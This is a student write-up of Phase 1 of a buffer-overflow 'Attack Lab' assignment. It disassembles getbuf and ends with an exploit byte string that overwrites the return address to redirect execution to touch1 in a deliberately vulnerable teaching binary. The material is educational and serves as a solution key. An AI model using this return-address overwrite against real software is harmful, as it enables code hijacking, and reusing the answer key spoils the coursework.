
# Phase 1

## Attack Lab Spec

For Phase 1, you will not inject new code. Instead, your exploit string will redirect the program to execute an existing procedure.
Function getbuf is called within CTARGET by a function test having the following C code:  
```
void test()          
{
  int val;
  val = getbuf();
  printf("No exploit. Getbuf returned 0x%x\n", val);
}
```
When `getbuf` executes its return statement (line 5 of `getbuf`), the program ordinarily resumes execution
within function `test` (at line 5 of this function). We want to change this behavior. Within the file `ctarget`,
there is code for a function `touch1` having the following C representation:  
```
void touch1()
{
  vlevel = 1; /* Part of validation protocol */
  printf("Touch1!: You called touch1()\n"); 
  validate(1);
  exit(0);
}
```
Your task is to get `CTARGET` to execute the code for `touch1` when `getbuf` executes its return statement,
rather than returning to `test`. Note that your exploit string may also corrupt parts of the stack not directly
related to this stage, but this will not cause a problem, since `touch1` causes the program to exit directly.

**Some Advice**:  
• All the information you need to devise your exploit string for this level can be determined by examining a disassembled version of `CTARGET`. Use `objdump -d` to get this dissembled version.  
• The idea is to position a byte representation of the starting address for `touch1` so that the ret instruction at the end of the code for `getbuf` will transfer control to `touch1`.  
• Be careful about byte ordering.  
• You might want to use GDB to step the program through the last few instructions of `getbuf` to make sure it is doing the right thing.  
• The placement of `buf` within the stack frame for `getbuf` depends on the value of compile-time constant BUFFER_SIZE, as well the allocation strategy used by GCC. You will need to examine the disassembled code to determine its position.  

## Analysis

It's clear that we need to get to `touch1` from `getbuf`. Looking at `getbuf` in cobjectdum we see the following code:  
```
00000000004017be <getbuf>:
4017be:	48 83 ec 18          	sub    $0x18,%rsp
4017c2:	48 89 e7             	mov    %rsp,%rdi
4017c5:	e8 30 02 00 00       	callq  4019fa <Gets>
4017ca:	b8 01 00 00 00       	mov    $0x1,%eax
4017cf:	48 83 c4 18          	add    $0x18,%rsp
4017d3:	c3                   	retq
```
Looking at the code, we see the following things happen. We put 0x18 bytes of storage on the stack, and then put our stack pointer into rdi. The function `Gets` is then called which we can assume
inputs whatever we enter into the stack. This pens up the opportunity for code injection. For phase 1, this is simply just changing the return address, which is always the last thing on the stack when
a function exits. We can confirm this by considering that we add 0x18 back to the rsp and then retq, which pops the value held at rsp and then goes to it. Therefore, if we can inject 0x18 bytes of random values and then the address of `touch1` when `retq` attempts to return to the address pointed to by rsp, it'll be our address. Looking again through the object dumb for `touch1` we see  
`00000000004017d4 <touch1>`  
which tells us that our touch1 function is at address 0x4017d4. We remember that x86-64 operates on little endian, and thus in our string the address must be formatted correctly.

## Final Solution

Knowing that our `getbuf` requires 0x18 or 1 * 16 + 8 * 1 = 24 bytes of input and then our return address, we can put the two together to yield the final injection string:
`00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 d4 17 40`  
